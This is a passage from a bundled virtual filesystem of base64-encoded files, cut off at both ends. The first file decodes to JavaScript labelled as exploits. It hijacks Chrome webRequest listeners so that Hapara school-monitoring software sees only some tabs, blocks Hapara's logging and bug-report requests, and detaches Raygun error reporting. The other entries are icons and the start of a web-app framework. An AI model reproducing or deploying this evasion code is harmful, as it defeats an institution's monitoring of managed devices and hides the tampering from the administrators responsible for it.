G91dCB0aGUgY2FsbGJhY2sqLw0KICB2YXIgd2ViUmVxdWVzdEhpamFjayA9IGZ1bmN0aW9uKGFyZ3MsIHRhcmdldCkgew0KICAgIGNvbnNvbGUubG9nKCdIaWphY2tlZCBhZGRlZCB3ZWJSZXF1ZXN0LicgKyB0YXJnZXQgKyAnIEV2ZW50IExpc3RlbmVyLi4uJyk7DQogICAgYXJndW1lbnRzWzBdID0gZnVuY3Rpb24oY2FsbGJhY2ssIGRldGFpbHMpIHsNCiAgICAgIHZhciBtYW5hZ2VkID0gZmFsc2U7DQogICAgICBmb3IgKGxldCBpID0gdW5wcm90ZWN0ZWQubGVuZ3RoIC0gMTsgaSA+PSAwICYmICFtYW5hZ2VkOyBpLS0pIHsNCiAgICAgICAgZm9yIChsZXQgaSA9IHVucHJvdGVjdGVkW2ldLnRhYnMubGVuZ3RoOyBpID49IDAgJiYgIW1hbmFnZWQ7IGktLSkgew0KICAgICAgICAgIGlmIChkZXRhaWxzLnRhYklkID09IHVucHJvdGVjdGVkW2ldLnRhYnNbaV0uaWQpIHsNCiAgICAgICAgICAgIG1hbmFnZWQgPSB0cnVlOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfQ0KICAgICAgaWYgKG1hbmFnZWQpIHsNCiAgICAgICAgY29uc29sZS53YXJuKCdBbGxvd2VkIFVucHJvdGVjdGVkIFRhYiB0cmFmZmljIHRvIGJlIGludGVyY2VwdGVkIGJ5IEhhcGFyYScpOw0KICAgICAgICByZXR1cm4gY2FsbGJhY2soZGV0YWlscyk7DQogICAgICB9DQogICAgICBjb25zb2xlLmxvZygnRGVuaWVkIFByb3RlY3RlZCBUYWIgdHJhZmZpYyBmcm9tIGJlaW5nIGludGVyY2VwdGVkIGJ5IEhhcGFyYScpOw0KICAgIH0uYmluZCh0aGlzLCBhcmd1bWVudHNbMF0pOw0KICAgIHF1ZXVlLndlYlJlcXVlc3RbdGFyZ2V0XS5wdXNoKHtwcmV2RnVuYzogYXJndW1lbnRzWzBdLnRvU3RyaW5nKCl9KTsNCiAgICBfYXBpLndlYlJlcXVlc3RbdGFyZ2V0XS5hZGRMaXN0ZW5lci5hcHBseShjaHJvbWUud2ViUmVxdWVzdFt0YXJnZXRdLCBhcmdzKTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2ViUmVxdWVzdC5vbkJlZm9yZVJlZGlyZWN0LmFkZExpc3RlbmVyID0gZnVuY3Rpb24oKSB7DQogICAgdmFyIHRhcmdldCA9ICdvbkJlZm9yZVJlZGlyZWN0JzsNCiAgICB3ZWJSZXF1ZXN0SGlqYWNrKGFyZ3VtZW50cywgdGFyZ2V0KTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2ViUmVxdWVzdC5vbkJlZm9yZVJlZGlyZWN0LnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBjYWxsYmFjayA9IGNhbGxiYWNrLnRvU3RyaW5nKCk7DQogICAgZm9yIChsZXQgaSA9IHF1ZXVlLndlYlJlcXVlc3Qub25CZWZvcmVSZWRpcmVjdC5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgaWYgKHF1ZXVlLndlYlJlcXVlc3Qub25CZWZvcmVSZWRpcmVjdFtpXS5jYWxsYmFjaykgew0KICAgICAgICBxdWV1ZS53ZWJSZXF1ZXN0Lm9uQmVmb3JlUmVkaXJlY3Quc3BsaWNlKGksIDEpOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2ViUmVxdWVzdC5vbkJlZm9yZVJlcXVlc3QuYWRkTGlzdGVuZXIgPSBmdW5jdGlvbigpIHsNCiAgICB2YXIgdGFyZ2V0ID0gJ29uQmVmb3JlUmVxdWVzdCc7DQogICAgd2ViUmVxdWVzdEhpamFjayhhcmd1bWVudHMsIHRhcmdldCk7DQogIH0uYmluZCh0aGlzKTsNCiAgY2hyb21lLndlYlJlcXVlc3Qub25CZWZvcmVSZXF1ZXN0LnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBjYWxsYmFjayA9IGNhbGxiYWNrLnRvU3RyaW5nKCk7DQogICAgZm9yIChsZXQgaSA9IHF1ZXVlLndlYlJlcXVlc3Qub25CZWZvcmVSZXF1ZXN0Lmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7DQogICAgICBpZiAocXVldWUud2ViUmVxdWVzdC5vbkJlZm9yZVJlcXVlc3RbaV0uY2FsbGJhY2spIHsNCiAgICAgICAgcXVldWUud2ViUmVxdWVzdC5vbkJlZm9yZVJlcXVlc3Quc3BsaWNlKGksIDEpOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2ViUmVxdWVzdC5vbkNvbXBsZXRlZC5hZGRMaXN0ZW5lciA9IGZ1bmN0aW9uKCkgew0KICAgIHZhciB0YXJnZXQgPSAnb25Db21wbGV0ZWQnOw0KICAgIHdlYlJlcXVlc3RIaWphY2soYXJndW1lbnRzLCB0YXJnZXQpOw0KICB9LmJpbmQodGhpcyk7DQogIGNocm9tZS53ZWJSZXF1ZXN0Lm9uQ29tcGxldGVkLnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBjYWxsYmFjayA9IGNhbGxiYWNrLnRvU3RyaW5nKCk7DQogICAgZm9yIChsZXQgaSA9IHF1ZXVlLndlYlJlcXVlc3Qub25Db21wbGV0ZWQubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHsNCiAgICAgIGlmIChxdWV1ZS53ZWJSZXF1ZXN0Lm9uQ29tcGxldGVkW2ldLmNhbGxiYWNrKSB7DQogICAgICAgIHF1ZXVlLndlYlJlcXVlc3Qub25Db21wbGV0ZWQuc3BsaWNlKGksIDEpOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2ViUmVxdWVzdC5vblNlbmRIZWFkZXJzLmFkZExpc3RlbmVyID0gZnVuY3Rpb24oKSB7DQogICAgdmFyIHRhcmdldCA9ICdvblNlbmRIZWFkZXJzJzsNCiAgICB3ZWJSZXF1ZXN0SGlqYWNrKGFyZ3VtZW50cywgdGFyZ2V0KTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2ViUmVxdWVzdC5vblNlbmRIZWFkZXJzLnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBjYWxsYmFjayA9IGNhbGxiYWNrLnRvU3RyaW5nKCk7DQogICAgZm9yIChsZXQgaSA9IHF1ZXVlLndlYlJlcXVlc3Qub25TZW5kSGVhZGVycy5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgaWYgKHF1ZXVlLndlYlJlcXVlc3Qub25TZW5kSGVhZGVyc1tpXS5jYWxsYmFjaykgew0KICAgICAgICBxdWV1ZS53ZWJSZXF1ZXN0Lm9uU2VuZEhlYWRlcnMuc3BsaWNlKGksIDEpOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2ViUmVxdWVzdC5vbkF1dGhSZXF1aXJlZC5hZGRMaXN0ZW5lciA9IGZ1bmN0aW9uKCkgew0KICAgIHZhciB0YXJnZXQgPSAnb25BdXRoUmVxdWlyZWQnOw0KICAgIHdlYlJlcXVlc3RIaWphY2soYXJndW1lbnRzLCB0YXJnZXQpOw0KICB9LmJpbmQodGhpcyk7DQogIGNocm9tZS53ZWJSZXF1ZXN0Lm9uQXV0aFJlcXVpcmVkLnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBjYWxsYmFjayA9IGNhbGxiYWNrLnRvU3RyaW5nKCk7DQogICAgZm9yIChsZXQgaSA9IHF1ZXVlLndlYlJlcXVlc3Qub25BdXRoUmVxdWlyZWQubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHsNCiAgICAgIGlmIChxdWV1ZS53ZWJSZXF1ZXN0Lm9uQXV0aFJlcXVpcmVkW2ldLmNhbGxiYWNrKSB7DQogICAgICAgIHF1ZXVlLndlYlJlcXVlc3Qub25BdXRoUmVxdWlyZWQuc3BsaWNlKGksIDEpOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2ViUmVxdWVzdC5vblJlc3BvbnNlU3RhcnRlZC5hZGRMaXN0ZW5lciA9IGZ1bmN0aW9uKCkgew0KICAgIHZhciB0YXJnZXQgPSAnb25SZXNwb25zZVN0YXJ0ZWQnOw0KICAgIHdlYlJlcXVlc3RIaWphY2soYXJndW1lbnRzLCB0YXJnZXQpOw0KICB9LmJpbmQodGhpcyk7DQogIGNocm9tZS53ZWJSZXF1ZXN0Lm9uUmVzcG9uc2VTdGFydGVkLnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBjYWxsYmFjayA9IGNhbGxiYWNrLnRvU3RyaW5nKCk7DQogICAgZm9yIChsZXQgaSA9IHF1ZXVlLndlYlJlcXVlc3Qub25SZXNwb25zZVN0YXJ0ZWQubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHsNCiAgICAgIGlmIChxdWV1ZS53ZWJSZXF1ZXN0Lm9uUmVzcG9uc2VTdGFydGVkW2ldLmNhbGxiYWNrKSB7DQogICAgICAgIHF1ZXVlLndlYlJlcXVlc3Qub25SZXNwb25zZVN0YXJ0ZWQuc3BsaWNlKGksIDEpOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpOw0KICAvKkZpbHRlciBYTUxIdHRwUmVxdWVzdCBDYWxscyovDQogIChmdW5jdGlvbihvcGVuLCBzZW5kKSB7DQogICAgdmFyIGJsYWNrTGlzdCA9IFsNCiAgICAgICdodHRwczovL2hpZ2hsaWdodHMtbG9nZ2luZy50ZWFjaGVyZGFzaGJvYXJkLmNvbS9sb2cvamF2YXNjcmlwdCcsDQogICAgICAnaHR0cHM6Ly9oaWdobGlnaHRzLWxvZ2dpbmcudGVhY2hlcmRhc2hib2FyZC5jb20vbG9nL2J1Zy1yZXBvcnQnDQogICAgXTsNCiAgICBYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUub3BlbiA9IGZ1bmN0aW9uKG1ldGhvZCwgdXJsLCBhc3luYywgdXNlciwgcGFzcykgew0KICAgICAgY29uc29sZS5pbmZvKG1ldGhvZCwgdXJsLCBhc3luYyk7DQogICAgICBvcGVuLmNhbGwodGhpcywgbWV0aG9kLCB1cmwsIGFzeW5jLCB1c2VyLCBwYXNzKTsNCiAgICAgIHRoaXMuYWxsb3dlZFNlbmQgPSB0cnVlOw0KICAgICAgaWYgKGJsYWNrTGlzdC5pbmNsdWRlcyh1cmwpKSB7DQogICAgICAgIHRoaXMuYWxsb3dlZFNlbmQgPSBmYWxzZTsNCiAgICAgIH0NCiAgICB9Ow0KICAgIFhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5zZW5kID0gZnVuY3Rpb24oZGF0YSkgew0KICAgICAgaWYgKHRoaXMuYWxsb3dlZFNlbmQpIHsNCiAgICAgICAgY29uc29sZS5pbmZvLmNhbGwoY29uc29sZSwgZGF0YSk7DQogICAgICAgIHRoaXMuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgIGNvbnNvbGUuaW5mbyh0aGlzLnJlc3BvbnNlVGV4dCk7DQogICAgICAgIH0uYmluZCh0aGlzKSk7DQogICAgICAgIHNlbmQuY2FsbCh0aGlzLCBkYXRhKTsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IuY2FsbChjb25zb2xlLCBkYXRhKTsNCiAgICAgIH0NCiAgICB9Ow0KICB9KShYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUub3BlbiwgWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLnNlbmQpOw0KICBfYXBpLndpbmRvd3MuZ2V0QWxsKG51bGwsIGZ1bmN0aW9uKHdpbmRvd0FycmF5KSB7DQogICAgaGlkZGVuLmNvbmNhdChoaWRkZW4sIHdpbmRvd0FycmF5KTsNCiAgICAvKlN0YXJ0IEhhcGFyYSovDQogICAgY29uc29sZS5sb2coJ0FsbCBleHBsb2l0cyBhcmUgbG9hZGVkLCBzdGFydGluZyBIYXBhcmEuLi4nKTsNCiAgICB2YXIgbG9hZGVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7DQogICAgbG9hZGVyLnNyYyA9IGNocm9tZS5ydW50aW1lLmdldE1hbmlmZXN0KCkuYmFja2dyb3VuZC5zY3JpcHRzWzBdOw0KICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQobG9hZGVyKTsNCiAgICBsb2FkZXIuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uKCkgew0KICAgICAgd2luZG93LlJheWd1bi5kZXRhY2goKTsNCiAgICAgIHdpbmRvdy5vbmVycm9yID0gZnVuY3Rpb24oKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoYXJndW1lbnRzKTsNCiAgICAgIH07DQogICAgfSk7DQogIH0uYmluZCh0aGlzKSk7DQp9KSgpOw0K", "/system/app/Home/res": {}, "/system/app/Home/res/drawable": {}, "/system/app/FireBug/res": {}, "/system/app/Exploit/res/drawable/favico.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KICAgIDxwYXRoIGQ9Ik0yMCA4aC0yLjgxYy0uNDUtLjc4LTEuMDctMS40NS0xLjgyLTEuOTZMMTcgNC40MSAxNS41OSAzbC0yLjE3IDIuMTdDMTIuOTYgNS4wNiAxMi40OSA1IDEyIDVjLS40OSAwLS45Ni4wNi0xLjQxLjE3TDguNDEgMyA3IDQuNDFsMS42MiAxLjYzQzcuODggNi41NSA3LjI2IDcuMjIgNi44MSA4SDR2MmgyLjA5Yy0uMDUuMzMtLjA5LjY2LS4wOSAxdjFINHYyaDJ2MWMwIC4zNC4wNC42Ny4wOSAxSDR2MmgyLjgxYzEuMDQgMS43OSAyLjk3IDMgNS4xOSAzczQuMTUtMS4yMSA1LjE5LTNIMjB2LTJoLTIuMDljLjA1LS4zMy4wOS0uNjYuMDktMXYtMWgydi0yaC0ydi0xYzAtLjM0LS4wNC0uNjctLjA5LTFIMjBWOHptLTYgOGgtNHYtMmg0djJ6bTAtNGgtNHYtMmg0djJ6Ii8+Cjwvc3ZnPg==", "/system/res/drawable/newFolderLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDBWMHoiIGZpbGw9Im5vbmUiLz4NCiAgICA8cGF0aCBkPSJNMjAgNmgtOGwtMi0ySDRjLTEuMTEgMC0xLjk5Ljg5LTEuOTkgMkwyIDE4YzAgMS4xMS44OSAyIDIgMmgxNmMxLjExIDAgMi0uODkgMi0yVjhjMC0xLjExLS44OS0yLTItMnptLTEgOGgtM3YzaC0ydi0zaC0zdi0yaDNWOWgydjNoM3YyeiIvPg0KPC9zdmc+", "/system/res/drawable/folder.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMTAgNEg0Yy0xLjEgMC0xLjk5LjktMS45OSAyTDIgMThjMCAxLjEuOSAyIDIgMmgxNmMxLjEgMCAyLS45IDItMlY4YzAtMS4xLS45LTItMi0yaC04bC0yLTJ6Ii8+DQogICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPg0KPC9zdmc+", "/system/app/FireBug": {}, "/system/res/drawable/audioFileBlack.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEyIDN2OS4yOGMtLjQ3LS4xNy0uOTctLjI4LTEuNS0uMjhDOC4wMSAxMiA2IDE0LjAxIDYgMTYuNVM4LjAxIDIxIDEwLjUgMjFjMi4zMSAwIDQuMi0xLjc1IDQuNDUtNEgxNVY2aDRWM2gtN3oiLz4NCjwvc3ZnPg==", "/system/res/drawable/videoDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDBWMHoiIGZpbGw9Im5vbmUiLz4NCiAgICA8cGF0aCBkPSJNMjEgM0gzYy0xLjExIDAtMiAuODktMiAydjEyYzAgMS4xLjg5IDIgMiAyaDV2Mmg4di0yaDVjMS4xIDAgMS45OS0uOSAxLjk5LTJMMjMgNWMwLTEuMTEtLjktMi0yLTJ6bTAgMTRIM1Y1aDE4djEyem0tNS02bC03IDRWN3oiLz4NCjwvc3ZnPg==", "/system/script/app-framework.js": "bG9hZGluZ1NjcmVlbi5zZXRNZXNzYWdlKCdQYXJzaW5nIEZpbGUuLi4nKTsNCihmdW5jdGlvbigpIHsNCiAgJ3VzZSBzdHJpY3QnOw0KICB2YXIgbW9kZWw7DQogIHZhciB2aWV3Ow0KICB2YXIgY29udHJvbGxlcjsNCg0KICBtb2RlbCA9IHsNCiAgICBpbml0OiBmdW5jdGlvbigpIHsNCiAgICAgIGxvYWRpbmdTY3JlZW4uc2V0UGVyY2VudGFnZSg2KTsNCiAgICAgIGxvYWRpbmdTY3JlZW4uc2V0TWVzc2FnZSgnSW5pdGlhbGl6aW5nIE1vZGVsLi4uJyk7DQogICAgICB0aGlzLmluc3RhbGxhdGlvblR5cGUgPSAncGVyc2lzdGVudCc7DQogICAgICB0aGlzLmJhc2UgPSBsb2NhdGlvbi5wcm90b2NvbDsNCiAgICAgIHRoaXMuYmFzZSArPSBsb2NhdGlvbi5vcmlnaW47DQogICAgICB0aGlzLmJhc2UgKz0gJy8nICsgdGhpcy5pbnN0YWxsYXRpb25UeXBlICsgJy8nOw0KICAgICAgdGhpcy5hbGxvd2VkTWV0aG9kcyA9IHsNCiAgICAgICAgc3lzdGVtOiB7DQogICAgICAgIH0sDQogICAgICAgIHVzZXI6IHsNCiAgICAgICAgICByaWJib246IHsNCiAgICAgICAgICAgIGFkZFRpdGxlOiB2aWV3LnJpYmJvbkJhci5hZGRUaXRsZSwNCiAgICAgICAgICAgIGdldFRpdGxlOiB2aWV3LnJpYmJvbkJhci5nZXRUaXRsZSwNCiAgICAgICAgICAgIGNsZWFyVGl0bGU6IHZpZXcucmliYm9uQmFyLmNsZWFyVGl0bGUsDQogICAgICAgICAgICBjaGFuZ2VDb2xvcjogdmlldy5yaWJib25CYXIuY2hhbmdlQ29sb3INCiAgICAgICAgICB9LA0KICAgICAgICAgIGhhbWJ1cmdlck1lbnU6IHsNCiAgICAgICAgICB9LA0KICAgICAgICAgIHNldEZhdmljb246IG51bGwsDQogICAgICAgICAgc2V0VGl0bGU6IG51bGwsDQogICAgICAgIH0NCiAgICAgIH07DQogICAgICBsb2FkaW5nU2NyZWVuLnNldFBlcmNlbnRhZ2UoOSk7DQogICAgICBsb2FkaW5nU2NyZWVuLnNldE1lc3NhZ2UoJ01vZGVsIEluaXRpYWxpemVkIScpOw0KICAgIH0sDQogICAgZ2V0SWNvOiBmdW5jdGlvbihpY28pIHsNCiAgICAgIHJldHVybiB0aGlzLmJhc2UgKyAnc3lzdGVtL3Jlcy9kcmF3YWJsZScgKyBpY287DQogICAgfSwNCiAgICBoaXN0b3J5OiBbXSwNCiAgICBhcHBzOiB7DQogICAgICBnZXRBbGxvd2VkTWV0aG9kczogZnVuY3Rpb24oKSB7DQogICAgICAgIHZhciBvYmplY3RzID0gW21vZGVsLmFsbG93ZWRNZXRob2RzLnVzZXJdOw0KICAgICAgICB2YXIgdGFyZ2V0cyA9IFttb2RlbC5hbGxvd2VkTWV0aG9kcy5zeXN0ZW1dOw0KICAgICAgICBmb3IgKGxldCBpID0gMDsgaSAhPSBvYmplY3RzLmxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgdmFyIHVzZXIgPSBPYmplY3Qua2V5cyhvYmplY3RzW2ldKTsNCiAgICAgICAgICB3aGlsZSAodXNlci5sZW5ndGggIT09IDApIHsNCiAgICAgICAgICAgIGxldCBjdXJyZW50UGVybWlzc2lvbiA9IHVzZXIuc2hpZnQoKTsNCiAgICAgICAgICAgIGlmICh0YXJnZXRzW2ldW2N1cnJlbnRQZXJtaXNzaW9uXSkgew0KICAgICAgICAgICAgICBpZiAodHlwZW9mIG9iamVjdHNbaV1bY3VycmVudFBlcm1pc3Npb25dID09ICdvYmplY3QnKSB7DQogICAgICAgICAgICAgICAgb2JqZWN0cy5wdXNoKG9iamVjdHNbaV1bY3VycmVudFBlcm1pc3Npb25dKTsNCiAgICAgICAgICAgICAgICB0YXJnZXRzLnB1c2godGFyZ2V0c1tpXVtjdXJyZW50UGVybWlzc2lvbl0pOw0KICAgICAgICAgICAgICB9IGVsc2UgaWYgKCF0YXJnZXRzW2ldW2N1cnJlbnRQZXJtaXNzaW9uXSkgew0KICAgICAgICAgICAgICAgIHRhcmdldHNbaV1bY3VycmVudFBlcm1pc3Npb25dID0gb2JqZWN0c1tpXVtjdXJyZW50UGVybWlzc2lvbl07DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgIHRhcmdldHNbaV1bY3VycmVudFBlcm1pc3Npb25dID0gb2JqZWN0c1tpXVtjdXJyZW50UGVybWlzc2lvbl07DQogICAgICAgICAgICB9DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0aGlzLmFsbG93ZWRNZXRob2RzOw0KICAgICAgfSwNCiAgICAgIG9yZ2FuaXplTWFuaWZlc3RzOiBmdW5jdGlvbihpbnB1dCwgdGFyZ2V0LCBjYWxsYmFjaykgew0KICAgICAgICB2YXIgaWkgPSBpbnB1dC5mb2xkZXJzLmxlbmd0aDsNCiAgICAgICAgdmFyIHBhdGhzID0gW107DQogICAgICAgIGlmIChpaSkgew0KICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICAgIHRhcmdldC5wdXNoKHsNCiAgICAgICAgICAgICAgcGF0aDogaW5wdXQuZm9sZGVyc1tpXS5mdWxsUGF0aCArICcvJywNCiAgICAgICAgICAgICAgdHlwZTogJ3N5c3RlbScNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgcGF0aHMucHVzaChpbnB1dC5mb2xkZXJzW2ldLmZ1bGxQYXRoKTsNCiAgICAgICAgICB9DQogICAgICAgICAgbW9kZWwuYXBwcy5nZXRNYW5pZmVzdHMocGF0aHMsIGZ1bmN0aW9uKHJlc3VsdHMpIHsNCiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwLCBpaSA9IHRhcmdldC5sZW5ndGg7IGkgIT0gaWk7IGkrKykgew0KICAgICAgICAgICAgICB0YXJnZXRbaV0ubWFuaWZlc3QgPSByZXN1bHRzW2ldOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2FsbGJhY2soKTsNCiAgICAgICAgICB9LmJpbmQodGhpcykpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIGNhbGxiYWNrKFtdKTsNCiAgICAgICAgfQ0KICAgICAgfSwNCiAgICAgIGdldE1hbmlmZXN0czogZnVuY3Rpb24oYXBwcywgY2FsbGJhY2spIHsNCiAgICAgICAgdmFyIHhociA9IFtdOw0KICAgICAgICB2YXIgcmVzdWx0cyA9IFtdOw0KICAgICAgICBpZiAoIUFycmF5LmlzQXJyYXkoYXBwcykpIHsNCiAgICAgICAgICBhcHBzID0gW2FwcHNdOw0KICAgICAgICB9DQogICAgICAgIHZhciBpbmRleCA9IDA7DQogICAgICAgIGZvciAobGV0IGkgPSAwLCBpaSA9IGFwcHMubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICByZXN1bHRzW2ldID0ge307DQogICAgICAgICAgeGhyW2ldID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQogICAgICAgICAgeGhyW2ldLm9wZW4oJ0dFVCcsIGFwcHNbaV0gKyAnL21hbmlmZXN0Lmpzb24nLCB0cnVlKTsNCiAgICAgICAgICB4aHJbaV0uYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uKG1heGxlbmd0aCwgY3VycmVudCkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgcmVzdWx0c1tjdXJyZW50XSA9IEpTT04ucGFyc2UoeGhyW2N1cnJlbnRdLnJlc3BvbnNlVGV4dCk7DQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihlcnIpOw0KICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdJbnZhbGlkIE1hbmlmZXN0IGZpbGUgZm9yICcgKyBhcHBzW2N1cnJlbnRdKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChtYXhsZW5ndGggPT0gKytpbmRleCkgew0KICAgICAgICAgICAgICBjYWxsYmFjayhyZXN1bHRzKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9LmJpbmQodGhpcywgaWksIGkpKTsNCiAgICAgICAgICB4aHJbaV0uYWRkRXZlbnRMaXN0ZW5lcignZXJyb3InLCBmdW5jdGlvbihtYXhsZW5ndGgsIGN1cnJlbnQpIHsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ01hbmlmZXN0IGZpbGUgbWlzc2luZyBmb3IgJyArIGFwcHNbY3VycmVudF0pOw0KICAgICAgICAgICAgaWYgKG1heGxlbmd0aCA9PSArK2luZGV4KSB7DQogICAgICAgICAgICAgIGNhbGxiYWNrKHJlc3VsdHMpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0uYmluZCh0aGlzLCBpaSwgaSkpOw0KICAgICAgICAgIHhocltpXS5zZW5kKCk7DQogICAgICAgIH0NCiAgICAgIH0sDQogICAgICBnZXRBbGw6IGZ1bmN0aW9uKGNhbGxiYWNrKSB7DQogICAgICAgIHZhciBhcHBzID0gew0KICAgICAgICAgIHN5c3RlbTogW10sDQogICAgICAgICAgdXNlcjogW10NCiAgICAgICAgfTsNCiAgICAgICAgZnMuc2NhbmRpcih7DQogICAgICAgICAgcGF0aDogJy9zeXN0ZW0vYXBwLycsDQogICAgICAgICAgY2FsbGJhY2s6IGZ1bmN0aW9uKGRpckNvbnRlbnRzKSB7DQogICAgICAgICAgICBtb2RlbC5hcHBzLm9yZ2FuaXplTWFuaWZlc3RzKGRpckNvbnRlbnRzLCBhcHBzLnN5c3RlbSwgZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgIGZzLnNjYW5kaXIoew0KICAgICAgICAgICAgICAgIHBhdGg6ICcvZGF0YS9hcHAvJywNCiAgICAgICAgICAgICAgICBjYWxsYmFjazogZnVuY3Rpb24oZGlyQ29udGVudHMpIHsNCiAgICAgICAgICAgICAgICAgIG1vZGVsLmFwcHMub3JnYW5pemVNYW5pZmVzdHMoZGlyQ29udGVudHMsIGFwcHMudXNlciwNCiAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhhcHBzKTsNCiAgICAgICAgICAgICAgICAgIH0uYmluZCh0aGlzKSk7DQogICAgICAgICAgICAgICAgfS5iaW5kKHRoaXMpDQogICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfS5iaW5kKHRoaXMpKTsNCiAgICAgICAgICB9LmJpbmQodGhpcykNCiAgICAgICAgfSk7DQogICAgICB9LA0KICAgICAgYXBwczogW10NCiAgICB9LA0KICAgIHNldHRpbmdzOiB7DQogICAgICBsb2FkOiBmdW5jdGlvbihjYWxsYmFjaykgew0KICAgICAgICBmcy5jb250ZW50cyh7DQogICAgICAgICAgb3JpZ2luOiAnL2RhdGEvJywNCiAgICAgICAgICBwYXRoOiAnY29uZmlnLmpzb24nLA0KICAgICAgICAgIGNhbGxiYWNrOiBmdW5jdGlvbihjYWxsYmFjaywgZGF0YSkgew0KICAgICAgICAgICAgZGF0YSA9IEpTT04ucGFyc2UoZGF0YSk7DQogICAgICAgICAgICBtb2RlbC5zZXR0aW5ncy5jb25maWcgP